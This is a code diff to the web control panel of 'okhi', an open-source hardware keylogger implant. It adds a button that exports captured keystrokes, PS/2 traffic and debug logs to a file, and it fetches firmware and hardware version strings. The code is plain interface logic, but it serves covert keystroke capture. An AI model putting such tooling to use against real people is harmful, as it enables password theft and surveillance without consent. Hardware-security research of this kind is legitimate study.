@@ -62,7 +62,7 @@
         <div class="header">
             <h1>okhi - Open Keylogger Hardware Implant by Dreg</h1>
             <h2><a href="https://www.rootkit.es/">rootkit.es</a> - <a href="https://github.com/therealdreg/okhi/">GitHub</a></h2>
-			<h3>v3</h3>
+			<h3><span id="fwversion"></span> <span id="hwversion"></span></h3>
         </div>
         <form>  
 			<label for="keyboardType">KEYBOARD LANG</label>
@@ -85,9 +85,66 @@
             <label for="RpbufferData">RP DEBUG DATA</label>  
             <textarea id="RpbufferData" rows="10" readonly></textarea>
         </form>
+		<button id="downloadButton">DOWNLOAD ALL DATA</button>
     </div>
     
     <script>
+		document.getElementById('downloadButton').addEventListener('click', function() {
+			const data = [];
+			const fwVersion = document.getElementById('fwversion').textContent;
+			const hwVersion = document.getElementById('hwversion').textContent;
+			data.push("Firmware Version: \n" + fwVersion);
+			data.push("Hardware Version: \n" + hwVersion);
+			data.push("KEYBOARD LANG: \n" + document.getElementById('keyboardType').value);
+			data.push("KEYS: \n" + document.getElementById('hexData').value);
+			data.push("PS2 DATA: \n" + document.getElementById('bufferData').value);
+			data.push("ESP DEBUG DATA: \n" + document.getElementById('EspbufferData').value);
+			data.push("RP DEBUG DATA: \n" + document.getElementById('RpbufferData').value);
+			const content = data.join('\n\n');
+			const element = document.createElement('a');
+			const file = new Blob([content], { type: 'text/plain' });
+			const timestamp = new Date().toISOString().replace(/[-:.]/g, ""); 
+			element.href = URL.createObjectURL(file);
+			element.download = `data_${timestamp}.txt`;
+			document.body.appendChild(element);
+			element.click();
+			document.body.removeChild(element);
+		});
+
+		document.addEventListener("DOMContentLoaded", function() {
+			function getFirmVersion() {
+				fetch('/ver')
+					.then(response => response.text()) 
+					.then(version => {
+						document.getElementById('fwversion').textContent = "Firmware v"
+						document.getElementById('fwversion').textContent += version;
+					})
+					.catch(error => {
+						console.error('Error al obtener la FW versión, reintentando en 4 segundos...', error);
+						setTimeout(getFirmVersion, 4000);
+					});
+			}
+
+			setTimeout(getFirmVersion, 4000);
+		});
+		
+		document.addEventListener("DOMContentLoaded", function() {
+			function getHwVersion() {
+				fetch('/hwver')
+					.then(response => response.text()) 
+					.then(version => {
+						document.getElementById('hwversion').textContent = "Hardware "
+						document.getElementById('hwversion').textContent += version;
+					})
+					.catch(error => {
+						console.error('Error al obtener la HW versión, reintentando en 4 segundos...', error);
+						setTimeout(getHwVersion, 4500);
+					});
+			}
+
+			setTimeout(getHwVersion, 4500);
+		});
+
         class RemoteKeyboardTracker {
             constructor() {
                 this.keys = {};
@@ -186,7 +243,7 @@
                 console.log("Esp Data received:", data); // Debugging
                 let bufferData = document.getElementById('EspbufferData');
                 if (bufferData && data.trim() !== '') {
-                    bufferData.value = data;
+                    bufferData.value = data + '\n' + bufferData.value;
                 }
             })
             .catch(error => {
@@ -201,7 +258,7 @@
                 console.log("Rp Data received:", data); // Debugging
                 let bufferData = document.getElementById('RpbufferData');
                 if (bufferData && data.trim() !== '') {
-                    bufferData.value = data;
+                    bufferData.value = data + '\n' + bufferData.value;
                 }
             })
             .catch(error => {
